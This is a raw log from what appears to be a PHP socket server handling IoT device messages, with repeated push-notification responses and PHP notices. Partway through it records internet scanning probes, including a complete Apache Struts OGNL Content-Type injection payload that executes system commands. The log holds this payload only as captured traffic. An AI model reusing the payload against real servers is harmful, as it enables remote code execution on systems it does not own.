12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":8747040896527326653,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514261249781011%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 Content command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 parameter1 1 32 0 parameter2 1 45 0 alarm 1 1 command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : eUYeCYzfUwM:APA91bHihyCGNtnvFl-nYoJAuehlvCdzTHX7XV33sml093Ku-6RLiUFLCdeOoVK3CrGpMWOn4l9vThhPM8gPeI14fduyKye6g31-VNYcycRZEsOtiBBujQSk2KvThAJYmY0uqtPUQFNN Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":6901711642821627063,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514261262444915%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 Content command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 parameter1 1 32 0 parameter2 1 45 0 alarm 1 1 command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : eUYeCYzfUwM:APA91bHihyCGNtnvFl-nYoJAuehlvCdzTHX7XV33sml093Ku-6RLiUFLCdeOoVK3CrGpMWOn4l9vThhPM8gPeI14fduyKye6g31-VNYcycRZEsOtiBBujQSk2KvThAJYmY0uqtPUQFNN Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":8556643291851454010,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514261277799934%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 Content command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 parameter1 1 32 0 parameter2 1 45 0 alarm 1 1 command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : eUYeCYzfUwM:APA91bHihyCGNtnvFl-nYoJAuehlvCdzTHX7XV33sml093Ku-6RLiUFLCdeOoVK3CrGpMWOn4l9vThhPM8gPeI14fduyKye6g31-VNYcycRZEsOtiBBujQSk2KvThAJYmY0uqtPUQFNN Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":8202529220341420209,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514261294154031%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 Content command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 parameter1 1 32 0 parameter2 1 45 0 alarm 1 1 command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : eUYeCYzfUwM:APA91bHihyCGNtnvFl-nYoJAuehlvCdzTHX7XV33sml093Ku-6RLiUFLCdeOoVK3CrGpMWOn4l9vThhPM8gPeI14fduyKye6g31-VNYcycRZEsOtiBBujQSk2KvThAJYmY0uqtPUQFNN Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":8598369922470862292,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514261308333044%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] Connected at port 9898
+[45.76.177.252] Connected at port 9898
+[45.76.177.252] Connected at port 9898
+[45.76.177.252] Connected at port 9898
+[45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 Content command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 parameter1 1 32 0 parameter2 1 45 0 alarm 1 1 command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : eUYeCYzfUwM:APA91bHihyCGNtnvFl-nYoJAuehlvCdzTHX7XV33sml093Ku-6RLiUFLCdeOoVK3CrGpMWOn4l9vThhPM8gPeI14fduyKye6g31-VNYcycRZEsOtiBBujQSk2KvThAJYmY0uqtPUQFNN Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":6570597793871609470,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514262017983997%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] Connected at port 9898
+[45.76.177.252] Connected at port 9898
+[45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 Content command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 parameter1 1 32 0 parameter2 1 45 0 alarm 1 1 command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : eUYeCYzfUwM:APA91bHihyCGNtnvFl-nYoJAuehlvCdzTHX7XV33sml093Ku-6RLiUFLCdeOoVK3CrGpMWOn4l9vThhPM8gPeI14fduyKye6g31-VNYcycRZEsOtiBBujQSk2KvThAJYmY0uqtPUQFNN Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":4988278107456852017,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514262057266817%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] Connected at port 9898
+[45.76.177.252] recieved: GET /recordings//theme/main.css HTTP/1.1
+User-Agent: curl/7.29.0
+Host: 45.76.177.252:9898
+Accept: */*
+
+ Content GET /recordings//theme/main.css HTTP/1.1User-Agent: curl/7.29.0Host: 45.76.177.252:9898Accept: */* PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0 GET /recordings//theme/main.css HTTP/1.1User-Agent: curl/7.29.0Host: 45.76.177.252:9898Accept: */* PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  PHP Notice:  Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 71
+
+Notice: Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 71
+command  PHP Notice:  Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 72
+
+Notice: Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 72
+[45.76.177.252] Connected at port 9898
+[45.76.177.252] Connected at port 9898
+[45.76.177.252] recieved: GET / HTTP/1.1
+User-Agent: User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705
+Accept: */*
+Host: 45.76.177.252:9898
+Connection: Keep-Alive
+
+ Content GET / HTTP/1.1User-Agent: User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705Accept: */*Host: 45.76.177.252:9898Connection: Keep-Alive PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0 GET / HTTP/1.1User-Agent: User-Agent:Mozilla/4.0 (compatible PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0  MSIE 6.0 PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0  Windows NT 5.2 PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0  .NET CLR 1.0.3705Accept: */*Host: 45.76.177.252:9898Connection: Keep-Alive PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  PHP Notice:  Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 71
+
+Notice: Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 71
+command  PHP Notice:  Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 72
+
+Notice: Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 72
+[45.76.177.252] Connected at port 9898
+[45.76.177.252] recieved: GET /index.action HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
+Accept: */*
+Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','echo windows--2017'}:{'/bin/bash','-c','echo linux--2017'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.f Content GET /index.action HTTP/1.1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36Accept: */*Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','echo windows--2017'}:{'/bin/bash','-c','echo linux--2017'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.f PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0 GET /index.action HTTP/1.1User-Agent: Mozilla/5.0 (Macintosh PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  0  Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36Accept: */*Content-Type: %{(#nike 1 'multipart/form-data').(#dm PHP Notice:  Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 71
+
+Notice: Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 71
+command  PHP Notice:  Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 72
+
+Notice: Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 72
+[45.76.177.252] recieved: lush())}
+Host: 45.76.177.252:9898
+Connection: Keep-Alive
+
+ Content lush())}Host: 45.76.177.252:9898Connection: Keep-Alive PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0 lush())}Host: 45.76.177.252:9898Connection: Keep-Alive PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  PHP Notice:  Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 71
+
+Notice: Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 71
+command  PHP Notice:  Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 72
+
+Notice: Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 72
+[45.76.177.252] Connected at port 9898
+[45.76.177.252] recieved: GET /recordings//theme/main.css HTTP/1.1
+User-Agent: curl/7.29.0
+Host: 45.76.177.252:9898
+Accept: */*
+
+ Content GET /recordings//theme/main.css HTTP/1.1User-Agent: curl/7.29.0Host: 45.76.177.252:9898Accept: */* PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0 GET /recordings//theme/main.css HTTP/1.1User-Agent: curl/7.29.0Host: 45.76.177.252:9898Accept: */* PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  PHP Notice:  Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 71
+
+Notice: Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 71
+command  PHP Notice:  Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 72
+
+Notice: Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 72
+[45.76.177.252] Connected at port 9898
+[45.76.177.252] Connected at port 9898
+[45.76.177.252] recieved: GET //a2billing/admin/Public/index.php HTTP/1.1
+User-Agent: curl/7.29.0
+Host: 45.76.177.252:9898
+Accept: */*
+
+ Content GET //a2billing/admin/Public/index.php HTTP/1.1User-Agent: curl/7.29.0Host: 45.76.177.252:9898Accept: */* PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0 GET //a2billing/admin/Public/index.php HTTP/1.1User-Agent: curl/7.29.0Host: 45.76.177.252:9898Accept: */* PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  PHP Notice:  Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 71
+
+Notice: Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 71
+command  PHP Notice:  Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 72
+
+Notice: Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 72
+[45.76.177.252] Connected at port 9898
+[45.76.177.252] Connected at port 9898
+[45.76.177.252] Connected at port 9898
+[45.76.177.252] recieved: GET /recordings//theme/main.css HTTP/1.1
+User-Agent: curl/7.29.0
+Host: 45.76.177.252:9898
+Accept: */*
+
+ Content GET /recordings//theme/main.css HTTP/1.1User-Agent: curl/7.29.0Host: 45.76.177.252:9898Accept: */* PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0 GET /recordings//theme/main.css HTTP/1.1User-Agent: curl/7.29.0Host: 45.76.177.252:9898Accept: */* PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  PHP Notice:  Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 71
+
+Notice: Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 71
+command  PHP Notice:  Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 72
+
+Notice: Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 72
+[45.76.177.252] Connected at port 9898
+[45.76.177.252] recieved: GET /recordings//theme/main.css HTTP/1.1
+User-Agent: curl/7.29.0
+Host: 45.76.177.252:9898
+Accept: */*
+
+ Content GET /recordings//theme/main.css HTTP/1.1User-Agent: curl/7.29.0Host: 45.76.177.252:9898Accept: */* PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0 GET /recordings//theme/main.css HTTP/1.1User-Agent: curl/7.29.0Host: 45.76.177.252:9898Accept: */* PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  PHP Notice:  Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 71
+
+Notice: Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 71
+command  PHP Notice:  Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 72
+
+Notice: Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 72
+[45.76.177.252] Connected at port 9898
+[45.76.177.252] Connected at port 9898
+PHP Warning:  socket_write(): unable to write to socket [104]: Connection reset by peer in /projects/php-socket-server/sock/SocketClient.php on line 21
+
+Warning: socket_write(): unable to write to socket [104]: Connection reset by peer in /projects/php-socket-server/sock/SocketClient.php on line 21
+[45.76.177.252] Connected at port 9898
+[45.76.177.252] Connected at port 9898
+[45.76.177.252] recieved: GET //a2billing/admin/Public/index.php HTTP/1.1
+User-Agent: curl/7.29.0
+Host: 45.76.177.252:9898
+Accept: */*
+
+ Content GET //a2billing/admin/Public/index.php HTTP/1.1User-Agent: curl/7.29.0Host: 45.76.177.252:9898Accept: */* PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0 GET //a2billing/admin/Public/index.php HTTP/1.1User-Agent: curl/7.29.0Host: 45.76.177.252:9898Accept: */* PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  PHP Notice:  Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 71
+
+Notice: Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 71
+command  PHP Notice:  Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 72
+
+Notice: Undefined index: command in /projects/php-socket-server/php-socket-server.php on line 72
